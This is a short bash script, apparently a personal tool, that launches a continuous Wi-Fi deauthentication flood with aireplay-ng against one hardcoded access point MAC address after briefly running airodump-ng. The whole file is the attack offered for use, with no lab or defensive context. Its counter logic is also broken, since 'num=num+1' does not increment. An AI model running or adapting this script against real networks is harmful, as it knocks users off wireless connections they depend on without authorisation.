#!/bin/bash 
check(){
	ps -x |grep aireplay-ng | grep -v grep
	if [ $? -ne 0 ];then
		airodump-ng wlan1 & sleep 5;kill -9 $(ps -ef|grep airodump-ng|gawk '$0 !~/grep/ {print $2}' |tr -s '\n' ' ')
		aireplay-ng wlan1 -0 0 -a D8:C8:E9:96:3F:30
	fi
	
}
	num=0
 	check
	echo $num
	num=num+1
#wohenlihai!
#v1.0
